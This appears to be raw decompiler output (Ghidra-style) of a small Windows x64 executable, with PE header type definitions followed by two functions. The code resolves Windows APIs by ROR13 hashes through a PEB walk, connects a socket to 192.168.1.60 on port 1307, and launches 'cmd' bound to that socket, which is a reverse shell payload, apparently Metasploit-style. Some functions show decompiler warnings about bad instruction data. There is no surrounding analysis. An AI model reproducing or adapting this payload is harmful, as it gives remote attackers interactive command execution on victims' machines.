typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    qword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void * UniqueProcess;
    void * UniqueThread;
};

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ulong DWORD;

typedef uint UINT;

typedef void * LPVOID;

typedef ulonglong ULONG_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

typedef struct IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

struct IMAGE_OPTIONAL_HEADER64 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    pointer64 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    qword SizeOfStackReserve;
    qword SizeOfStackCommit;
    qword SizeOfHeapReserve;
    qword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 34404
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS64 IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

struct IMAGE_NT_HEADERS64 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER64 OptionalHeader;
};




void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  longlong lVar1;
  byte bVar2;
  longlong lVar3;
  ulonglong uVar4;
  undefined8 *puVar5;
  byte *pbVar6;
  uint uVar7;
  uint uVar8;
  int in_R10D;
  undefined in_stack_00000020;
  undefined in_stack_00000028;
  undefined in_stack_00000030;
  undefined in_stack_00000038;
  undefined in_stack_00000040;
  undefined in_stack_00000048;
  undefined4 in_stack_00000050;
  undefined1 in_stack_00000068;
  undefined2 in_stack_000000a4;
  
  FUN_1400040ca((char)param_1,(char)param_2,(char)param_3,(char)param_4,in_stack_00000020,
                in_stack_00000028,in_stack_00000030,in_stack_00000038,in_stack_00000040,
                in_stack_00000048,in_stack_00000050,in_stack_00000068,in_stack_000000a4);
  puVar5 = *(undefined8 **)(*(longlong *)((longlong)ProcessEnvironmentBlock + 0x18) + 0x20);
  do {
    uVar4 = (ulonglong)*(ushort *)((longlong)puVar5 + 0x4a);
    uVar7 = 0;
    pbVar6 = (byte *)puVar5[10];
    do {
      bVar2 = *pbVar6;
      if ('`' < (char)bVar2) {
        bVar2 = bVar2 - 0x20;
      }
      uVar7 = (uVar7 >> 0xd | uVar7 << 0x13) + (uint)bVar2;
      uVar4 = uVar4 - 1;
      pbVar6 = pbVar6 + 1;
    } while (uVar4 != 0);
    lVar1 = puVar5[4];
    uVar4 = (ulonglong)*(uint *)((ulonglong)*(uint *)(lVar1 + 0x3c) + lVar1 + 0x88);
    if (uVar4 != 0) {
      lVar3 = uVar4 + lVar1;
      uVar4 = (ulonglong)*(uint *)(lVar3 + 0x18);
      while ((int)uVar4 != 0) {
        uVar4 = uVar4 - 1;
        uVar8 = 0;
        pbVar6 = (byte *)((ulonglong)
                          *(uint *)((ulonglong)*(uint *)(lVar3 + 0x20) + lVar1 + uVar4 * 4) + lVar1)
        ;
        do {
          bVar2 = *pbVar6;
          uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (uint)bVar2;
          pbVar6 = pbVar6 + 1;
        } while (bVar2 != 0);
        if (uVar8 + uVar7 == in_R10D) {
                    // WARNING: Could not recover jumptable at 0x0001400040bc. Too many branches
                    // WARNING: Treating indirect jump as call
          (*(code *)((ulonglong)
                     *(uint *)((ulonglong)*(uint *)(lVar3 + 0x1c) + lVar1 +
                              CONCAT62((int6)(uVar4 >> 0x10),
                                       *(undefined2 *)
                                        ((ulonglong)*(uint *)(lVar3 + 0x24) + lVar1 + uVar4 * 2)) *
                              4) + lVar1))(param_1,param_2,param_3,param_4);
          return;
        }
      }
    }
    puVar5 = (undefined8 *)*puVar5;
  } while( true );
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Removing unreachable block (ram,0x0001400041bf)

void FUN_1400040ca(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                  undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                  undefined param_9,undefined param_10,undefined4 param_11,undefined param_12,
                  undefined2 param_13)

{
  undefined *puVar1;
  char cVar2;
  longlong lVar3;
  char *pcVar4;
  undefined8 uVar5;
  undefined *puVar6;
  char *pcVar7;
  code *unaff_retaddr;
  undefined8 uStackX_20;
  undefined8 uStack0000000000000060;
  undefined8 uStack0000000000000068;
  undefined7 in_stack_00000071;
  undefined8 uStack0000000000000078;
  undefined8 uStack0000000000000080;
  undefined8 uStack_1a8;
  undefined auStack_1a0 [416];
  
  uStack_1a8 = 0x3c01a8c01b050002;
  (*unaff_retaddr)(&stack0x00000000);
  lVar3 = (*unaff_retaddr)(0x101,auStack_1a0);
  uStack0000000000000060 = (*unaff_retaddr)(lVar3 + 2,lVar3 + 1,0,0);
  (*unaff_retaddr)(uStack0000000000000060,&uStack_1a8,0x10);
  uStack0000000000000080 = 0x646d63;
  uStack0000000000000078 = 0x646d63;
  lVar3 = 0xd;
  puVar1 = (undefined *)&stack0x00000060;
  do {
    puVar6 = puVar1;
    *(undefined8 *)(puVar6 + -8) = 0;
    lVar3 = lVar3 + -1;
    puVar1 = puVar6 + -8;
  } while (lVar3 != 0);
  *(undefined2 *)(puVar6 + 0x4c) = 0x101;
  _param_12 = uStack0000000000000060;
  puVar6[0x10] = 0x68;
  *(undefined **)(puVar6 + -0x10) = puVar6 + -8;
  *(undefined **)(puVar6 + -0x18) = puVar6 + 0x10;
  *(undefined8 *)(puVar6 + -0x20) = 0;
  *(undefined8 *)(puVar6 + -0x28) = 0;
  *(undefined8 *)(puVar6 + -0x30) = 0;
  *(undefined8 *)(puVar6 + -0x38) = 1;
  pcVar7 = (char *)0x0;
  *(undefined8 *)(puVar6 + -0x40) = 0x140004195;
  uStack0000000000000068 = uStack0000000000000060;
  (*unaff_retaddr)(0,&stack0x00000078,0,0);
  *(undefined8 *)(puVar6 + -0x40) = 0x1400041a5;
  (*unaff_retaddr)(*(undefined4 *)(puVar6 + -8),0xffffffffffffffff);
  *(undefined8 *)(puVar6 + -0x40) = 0x1400041b2;
  (*unaff_retaddr)();
  *(undefined8 *)(puVar6 + -0x18) = 0;
  uVar5 = *(undefined8 *)(puVar6 + -0x18);
  *(undefined8 *)(puVar6 + -0x18) = 0x1400041cc;
  pcVar4 = (char *)(*unaff_retaddr)(uVar5);
  cVar2 = (char)pcVar4;
  *pcVar4 = *pcVar4 + cVar2;
  *pcVar4 = *pcVar4 + cVar2;
  *pcVar7 = *pcVar7 + cVar2;
  *pcVar4 = *pcVar4 + cVar2;
  *pcVar4 = *pcVar4 + cVar2;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}


